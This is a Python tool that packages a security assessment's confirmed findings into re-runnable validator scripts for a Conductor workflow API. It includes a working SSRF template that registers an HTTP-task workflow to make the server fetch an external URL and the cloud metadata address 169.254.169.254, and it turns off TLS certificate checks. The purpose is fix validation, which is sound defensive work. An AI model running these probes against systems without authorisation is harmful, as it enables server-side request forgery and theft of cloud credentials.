#!/usr/bin/env python3
"""Build a self-contained REPRODUCTION PACKAGE from a run's confirmed findings, so the recipient can
fix, test, and re-validate each exploit — not just read a PDF.

  python bench/repro_package.py <dossier.json | findings.json> [--out reports/<id>/repro-package] [--pdf reports/<id>/report.pdf]

Emits: README.md, findings.json, report.html (+ report.pdf if available/renderable), env.example, and
per-finding self-contained validator scripts under scripts/ that each print a VULNERABLE / MITIGATED
verdict (re-run after a fix to confirm it). Every script that creates server-side objects registers
them for automatic cleanup. Secrets are read from the environment, never baked into the package."""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)


def _slug(s, n=40):
    return (re.sub(r"[^a-z0-9]+", "-", str(s or "").lower()).strip("-")[:n]) or "finding"


def _load_findings(path):
    doc = json.load(open(path))
    if isinstance(doc, dict):
        for k in ("confirmed_findings", "confirmed", "findings"):
            if isinstance(doc.get(k), list):
                return doc[k]
    return doc if isinstance(doc, list) else []


# ---- generated package files (templates kept brace-safe via .replace, not str.format) -------------

_COMMON_PY = r'''"""Shared helpers for the reproduction scripts: identity/token, X-Authorization client,
and automatic cleanup of any server-side objects a script creates. Reads ALL secrets from the env
(see env.example) — nothing sensitive is stored in this package."""
import atexit, json, os, ssl, sys, urllib.error, urllib.request

BASE = os.environ.get("SC_BASE_URL", "https://your-conductor.example.com/api").rstrip("/")
# external echo used to prove the SSRF primitive (server fetches an attacker URL); override freely.
CANARY = os.environ.get("SC_REPRO_CANARY_URL", "https://example.com/")
# internal target whose reachability is the dangerous case; the egress filter SHOULD block it.
INTERNAL = os.environ.get("SC_REPRO_INTERNAL_URL", "http://169.254.169.254/latest/meta-data/")
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
_CLEANUP = []

def _token():
    tok = os.environ.get("SC_TOKEN")
    if tok:
        return tok
    key, sec = os.environ.get("SC_KEY"), os.environ.get("SC_SECRET")
    if not (key and sec):
        sys.exit("Set SC_TOKEN, or SC_KEY + SC_SECRET (see env.example).")
    r = urllib.request.Request(BASE + "/token", method="POST",
                               data=json.dumps({"keyId": key, "keySecret": sec}).encode(),
                               headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(r, timeout=20, context=_CTX) as resp:
        return json.loads(resp.read())["token"]

_TOK = None
def token():
    global _TOK
    if _TOK is None:
        _TOK = _token()
    return _TOK

def api(method, path, body=None):
    """Authenticated Conductor API call (Orkes uses the X-Authorization header, raw token)."""
    url = path if path.startswith("http") else BASE + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method,
                               headers={"X-Authorization": token(), "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=30, context=_CTX) as resp:
            raw = resp.read().decode()
            return resp.status, (json.loads(raw) if raw.strip() else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw

def register_workflow(wf):
    """Register a workflow def (object, NOT array) and schedule it for cleanup."""
    st, _ = api("POST", "/metadata/workflow", wf)
    if st in (200, 204):
        _CLEANUP.append(("workflow", wf["name"], wf.get("version", 1)))
    return st

def start_and_poll(name, version=1, inp=None, tries=8):
    import time
    st, exec_id = api("POST", "/workflow/" + name, {} if inp is None else inp)
    if st not in (200, 204) or not exec_id:
        return st, None
    exec_id = exec_id if isinstance(exec_id, str) else (exec_id or {}).get("workflowId")
    for _ in range(tries):
        s, w = api("GET", "/workflow/%s?includeTasks=true" % exec_id)
        if isinstance(w, dict) and w.get("status") in ("COMPLETED", "FAILED", "TERMINATED", "COMPLETED_WITH_ERRORS"):
            return s, w
        time.sleep(1.5)
    return s, w

@atexit.register
def _cleanup():
    for kind, name, ver in _CLEANUP:
        if kind == "workflow":
            api("DELETE", "/metadata/workflow/%s/%s" % (name, ver))
    if _CLEANUP:
        print("  [cleanup] removed %d test object(s)." % len(_CLEANUP))

def verdict(vulnerable, detail):
    tag = "VULNERABLE" if vulnerable else "MITIGATED"
    print("\n=== VERDICT: %s ===\n%s" % (tag, detail))
    return 0 if not vulnerable else 2
'''


_SSRF_REPRO = r'''#!/usr/bin/env python3
"""REPRO/VALIDATE: __TITLE__

Confirmed during the assessment (CWE-918 / SSRF). A low-privilege tenant registers a Conductor
workflow whose HTTP task targets an attacker-controlled URL; starting it makes the SERVER fetch that
URL. This script reproduces the primitive and prints a verdict you can re-run after a fix.

  Probe 1 (external canary)  -> if the server fetches it, the SSRF primitive is present.
  Probe 2 (internal IMDS)    -> SHOULD be blocked by the cluster egress filter (defense in depth).

Run after setting creds (see ../env.example):  python repro___NN__.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import register_workflow, start_and_poll, verdict, CANARY, INTERNAL

TAG = "screpro-__NN__"

def _http_workflow(uri):
    name = TAG + "-" + str(abs(hash(uri)) % 100000)
    return name, {
        "name": name, "version": 1, "ownerEmail": "repro@example.com",
        "schemaVersion": 2, "timeoutPolicy": "ALERT_ONLY", "timeoutSeconds": 0,
        "tasks": [{
            "name": "probe", "taskReferenceName": "probe", "type": "HTTP",
            "inputParameters": {"http_request": {"uri": uri, "method": "GET", "connectionTimeOut": 5000, "readTimeOut": 5000}},
        }],
    }

def _fetched(wf_out):
    """Did the server actually perform the outbound fetch (response reflected back)?"""
    if not isinstance(wf_out, dict):
        return False, "no execution"
    tasks = wf_out.get("tasks") or []
    for t in tasks:
        out = (t.get("outputData") or {}).get("response") or {}
        body = out.get("body")
        sc = out.get("statusCode")
        if sc and not (isinstance(body, dict) and "blocked in this cluster" in str(body)):
            return True, "server fetched URL; reflected statusCode=%s body=%.80s" % (sc, str(body))
        if isinstance(body, dict) and "blocked" in str(body).lower():
            return False, "egress filter returned 403: %s" % str(body)[:120]
    return False, "no outbound fetch observed (status=%s)" % wf_out.get("status")

def main():
    print("[*] Probe 1: external canary %s" % CANARY)
    name, wf = _http_workflow(CANARY)
    if register_workflow(wf) not in (200, 204):
        return verdict(False, "Could not register the workflow (server rejected the definition) — "
                              "if this is the fix, user-controlled HTTP tasks are no longer accepted.")
    _, out = start_and_poll(name)
    ext_vuln, ext_detail = _fetched(out)
    print("    -> %s" % ext_detail)

    print("[*] Probe 2: internal IMDS %s (expected: blocked)" % INTERNAL)
    name2, wf2 = _http_workflow(INTERNAL)
    register_workflow(wf2)
    _, out2 = start_and_poll(name2)
    int_reach, int_detail = _fetched(out2)
    print("    -> %s" % int_detail)

    detail = ("External SSRF primitive: %s (%s)\nInternal/metadata reach: %s (%s)\n"
              "Fix is effective when BOTH are blocked (external fetch refused).") % (
        "PRESENT" if ext_vuln else "blocked", ext_detail,
        "REACHABLE" if int_reach else "blocked", int_detail)
    return verdict(ext_vuln or int_reach, detail)

if __name__ == "__main__":
    sys.exit(main())
'''


_GENERIC_REPRO = r'''#!/usr/bin/env python3
"""REPRO/VALIDATE: __TITLE__
(CWE: __CWE__ | __OWASP__)

Generic replay of the recorded proof-of-concept request. Inspect the printed response to judge
whether the issue still reproduces after a fix. Recorded reproduction steps:
__STEPS__

Run after setting creds (see ../env.example):  python repro___NN__.py
"""
import sys, os, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import api

POC = __POC__

def main():
    method = (POC.get("method") or "GET").upper()
    path = POC.get("url") or POC.get("path") or "/"
    body = POC.get("json") if POC.get("json") not in (None, {}) else None
    print("[*] Replaying PoC: %s %s" % (method, path))
    st, resp = api(method, path, body)
    print("    HTTP %s" % st)
    print(json.dumps(resp, indent=2)[:2000] if resp is not None else "(no body)")
    print("\n=== Review the response above against the finding's evidence to confirm/deny reproduction. ===")
    return 0

if __name__ == "__main__":
    sys.exit(main())
'''


def _gen_script(f, nn):
    title = str(f.get("title") or "finding").replace('"', "'")
    cat = (f.get("category") or "").lower()
    if cat == "ssrf":
        return _SSRF_REPRO.replace("__TITLE__", title).replace("__NN__", nn)
    poc = f.get("poc_request") or {}
    steps = f.get("reproduction")
    steps_txt = "\n".join("  %d. %s" % (i + 1, s) for i, s in enumerate(steps)) if isinstance(steps, list) \
        else ("  " + str(steps or "(see finding)"))
    return (_GENERIC_REPRO.replace("__TITLE__", title).replace("__CWE__", str(f.get("cwe") or ""))
            .replace("__OWASP__", str(f.get("owasp") or "")).replace("__STEPS__", steps_txt)
            .replace("__POC__", json.dumps(poc, indent=4)))


_RUN_ALL = r'''#!/usr/bin/env python3
"""Run every repro/validate script and print a verdict matrix. Exit code != 0 if any is VULNERABLE."""
import glob, os, subprocess, sys
HERE = os.path.dirname(os.path.abspath(__file__))
scripts = sorted(glob.glob(os.path.join(HERE, "repro_*.py")))
rows, any_vuln = [], False
for s in scripts:
    print("\n" + "=" * 78 + "\n# " + os.path.basename(s) + "\n" + "=" * 78)
    r = subprocess.run([sys.executable, s], capture_output=True, text=True)
    sys.stdout.write(r.stdout); sys.stderr.write(r.stderr)
    v = "VULNERABLE" if "VERDICT: VULNERABLE" in r.stdout else ("MITIGATED" if "VERDICT: MITIGATED" in r.stdout else "REVIEW")
    any_vuln = any_vuln or v == "VULNERABLE"
    rows.append((os.path.basename(s), v))
print("\n" + "=" * 78 + "\n VERDICT MATRIX\n" + "=" * 78)
for name, v in rows:
    print("  %-44s %s" % (name, v))
sys.exit(2 if any_vuln else 0)
'''


def _readme(findings, has_pdf):
    lines = [
        "# Reproduction package — security findings",
        "",
        "A self-contained kit to **reproduce, fix, and re-validate** the confirmed findings. Each",
        "`scripts/repro_*.py` re-runs an exploit and prints a verdict (`VULNERABLE` / `MITIGATED`), so",
        "after you ship a fix you can re-run it to prove the fix works.",
        "",
        "## Contents",
        "- `report.pdf` / `report.html` — the assessment report" + ("" if has_pdf else " (HTML only)"),
        "- `findings.json` — machine-readable confirmed findings",
        "- `scripts/` — one validator per finding + `run_all.py` + shared `_common.py`",
        "- `env.example` — credentials/config the scripts read from the environment",
        "",
        "## Setup",
        "```bash",
        "cp env.example .env && $EDITOR .env      # add your key/secret",
        "set -a && source .env && set +a          # export them",
        "python3 scripts/run_all.py               # run all; prints a VULNERABLE/MITIGATED matrix",
        "# or a single one:",
        "python3 scripts/repro_01_*.py",
        "```",
        "Secrets are read from the env only — **nothing sensitive is stored in this package**. Scripts",
        "that create server-side objects (test workflows) delete them automatically on exit.",
        "",
        "## Findings",
    ]
    for i, f in enumerate(findings, 1):
        lines.append("%d. **[%s]** %s — `%s`" % (
            i, str(f.get("severity", "?")).upper(), f.get("title"), f.get("objective_id") or f.get("category")))
    lines += [
        "",
        "## Interpreting verdicts",
        "- **VULNERABLE** — the exploit still reproduces; the issue is not fixed.",
        "- **MITIGATED** — the exploit no longer works (server refused the action / fetch blocked).",
        "- **REVIEW** — a generic PoC replay; inspect the printed response against the finding's evidence.",
        "",
        "> The SSRF validators probe an external canary (proves the SSRF primitive) **and** internal IMDS",
        "> `169.254.169.254` (which the cluster egress filter should block). A complete fix refuses the",
        "> external fetch too (e.g. allowlist task URIs / forbid user-controlled HTTP-task targets).",
    ]
    return "\n".join(lines) + "\n"


_ENV_EXAMPLE = """# Credentials + config for the reproduction scripts (read from the environment).
# Either supply a ready bearer token, OR a key/secret pair to exchange.
SC_BASE_URL=https://your-conductor.example.com/api
# SC_TOKEN=eyJ...                      # a short-lived token, OR:
SC_KEY=your-key-id
SC_SECRET=your-key-secret
# Optional overrides:
# SC_REPRO_CANARY_URL=https://example.com/         # external echo used to prove the SSRF primitive
# SC_REPRO_INTERNAL_URL=http://169.254.169.254/latest/meta-data/   # internal target (should be blocked)
"""


def build(findings_path, out_dir, pdf_path=None):
    findings = _load_findings(findings_path)
    if not findings:
        print("no confirmed findings in", findings_path); return 1
    # one script per DISTINCT vector: collapse exact-duplicate findings (same category + title),
    # keeping the richest, so the kit isn't a pile of near-identical scripts.
    _seen = {}
    for f in findings:
        key = ((f.get("category") or "").lower(), _slug(f.get("title"), 80))
        if key not in _seen or len(json.dumps(f)) > len(json.dumps(_seen[key])):
            _seen[key] = f
    findings = list(_seen.values())
    scripts_dir = os.path.join(out_dir, "scripts")
    os.makedirs(scripts_dir, exist_ok=True)

    json.dump(findings, open(os.path.join(out_dir, "findings.json"), "w"), indent=2)
    open(os.path.join(out_dir, "env.example"), "w").write(_ENV_EXAMPLE)
    open(os.path.join(scripts_dir, "_common.py"), "w").write(_COMMON_PY)
    open(os.path.join(scripts_dir, "run_all.py"), "w").write(_RUN_ALL)

    for i, f in enumerate(findings, 1):
        nn = "%02d_%s" % (i, _slug(f.get("category") or f.get("title")))
        open(os.path.join(scripts_dir, "repro_%s.py" % nn), "w").write(_gen_script(f, nn))

    # report: prefer the harness PDF; always (re)generate HTML from findings for portability
    has_pdf = False
    if pdf_path and os.path.isfile(pdf_path):
        shutil.copy(pdf_path, os.path.join(out_dir, "report.pdf")); has_pdf = True
    try:
        import interim_report
        meta = {"target": "https://your-conductor.example.com/", "identities": "see report", "run": "",
                "generated": "", "class": "SSRF", "raw_count": len(findings)}
        html = interim_report.build_html(interim_report._dedupe(findings), meta)
        open(os.path.join(out_dir, "report.html"), "w").write(html)
        if not has_pdf:
            try:
                from playwright.sync_api import sync_playwright
                hp = os.path.join(out_dir, "report.html")
                with sync_playwright() as p:
                    b = p.chromium.launch(headless=True); pg = b.new_page()
                    pg.goto("file://" + os.path.abspath(hp), wait_until="networkidle")
                    pg.pdf(path=os.path.join(out_dir, "report.pdf"), format="A4", print_background=True,
                           margin={"top": "14mm", "bottom": "14mm", "left": "10mm", "right": "10mm"})
                    b.close()
                has_pdf = True
            except Exception as e:
                print("  (pdf render skipped:", e, ")")
    except Exception as e:
        print("  (html render skipped:", e, ")")

    open(os.path.join(out_dir, "README.md"), "w").write(_readme(findings, has_pdf))
    shutil.make_archive(out_dir, "zip", out_dir)
    print("package: %s/ (%d findings, %d scripts) + %s.zip" % (
        out_dir, len(findings), len(findings), out_dir))
    return 0


def main(argv):
    ap = argparse.ArgumentParser()
    ap.add_argument("findings", help="dossier.json or findings json")
    ap.add_argument("--out", default=None)
    ap.add_argument("--pdf", default=None, help="existing report.pdf to bundle")
    a = ap.parse_args(argv)
    out = a.out or os.path.join(os.path.dirname(os.path.abspath(a.findings)), "repro-package")
    return build(a.findings, out, a.pdf)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
